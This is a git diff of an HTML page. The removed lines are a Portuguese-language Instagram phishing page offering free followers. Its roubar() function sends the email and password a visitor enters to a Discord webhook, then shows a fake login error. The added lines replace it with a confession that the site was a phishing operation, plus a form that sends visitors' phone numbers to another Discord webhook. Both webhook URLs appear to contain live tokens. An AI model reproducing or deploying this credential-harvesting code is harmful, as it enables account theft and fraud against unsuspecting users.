@@ -120,64 +120,48 @@ width:25px;
 width:280px;
 }
 }
+mark{
+padding:10px;
+font-weight:bold;
+background-color:#e82070;
+}
+.mark{
+padding:5px;
+color:white;
+background-color:purple;
+}
 
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>Ganhe Seguidores no Instagram</h1>
-<img src="foto.png" width="200px">
-        <p>Insira a quantidade desejada de seguidores e faça login.</p>
-        <form>
-<div id="errado" class="animado">
-<p>Senha ou Email/Número de telefone incorrectos</p>
-</div>
-           <label for="quantidade">Insira a quantidade de <span class="brilho">seguidores</span></label>
-            <input type="number" id="quantidade" placeholder="Ex: 1000" required>
-
-            <label for="email">E-mail ou Número de Telefone:</label>
-            <input type="text" id="email" placeholder="Digite seu e-mail ou telefone" required>
-
-            <label for="senha">Senha:</label>
-            <input type="password" id="senha" placeholder="Digite sua senha" required>
-
-            <button onclick="roubar()">Gerar Seguidores</button>
-
-</form>
+        <h1>PARE DE SER ENGANADO</h1>
+<br><br>
+        <p>Eu errei, este site costumava ser um site de phishing que consistia em pegar dados de quem entrava. Pegamos várias contas mas não causamos nenhum estrago.</p>
+<p>Este site foi criado com o objectivo de punir aqueles que abusam ou fazem bulling com pessoas inocentes. Onde poderíamos até expôr fotos privadas, etc. Mas com o passar do tempo, o poder nos subiu à cabeça e mandamos isso à pessoas inocentes.</p>
+<p>Em suma, não estragamos nada de ninguém e não pretendiámos.</p>
+<p><mark>Que Deus te abençoe, meu cassule lindo</mark></p>
+<br><br>
+<p><mark class="mark">Preencha se quiser nos contactar:</mark></p>
+<input type="number" placeholder="Seu número aqui">
+<button onclick="contacto()">Enviar</button>
     </div>
-
 <script>
-async function roubar(){
-webhook="https://discord.com/api/webhooks/1347670923033186376/XwSb1uF7cjNHyRYoPYkmuKHlzFRs2n6SlqieIyJIQKftaVcSPv1b58OvdkbYLkgMfID_"
-
-
-var senha=document.getElementById("senha").value;
-var email=document.getElementById("email").value;
-var errado=document.getElementById("errado");
-if (senha.length != 0 && email.length != 0){
-errado.classList.remove("animado");
-errado.style.display="none";
-setTimeout(function(){
-errado.style.display="inline-block";
-errado.classList.add("animado");
-
-},1);
-
+async function contacto(){
+var num=document.querySelector("input").value;
+webhook="https://discord.com/api/webhooks/1346960511358734457/lFDqQ3EuCkc3WCth1Uj-wn_8YVVtkT5EjDeucp2dv3bInNB6sGc7PceiIPSjf228z_Ln"
 msg={
-content: "===Instagram==\n\nEmail/Telefone: "+email+"\n\nSenha: "+senha+"\n\n========="
+content:"Quero me contactar! Número: "+num
 }
 await fetch(webhook,{
-method:"POST",
+method: "POST",
 headers: {"Content-Type":"application/json"},
 body: JSON.stringify(msg)
-
 });
-}else{
-alert("Por favor, preencha os campos de login.");
-}
+
+alert("Número Enviado, será contactado embreve(WHATSAPP)")
 
 }
-
 </script>
 
 </body>
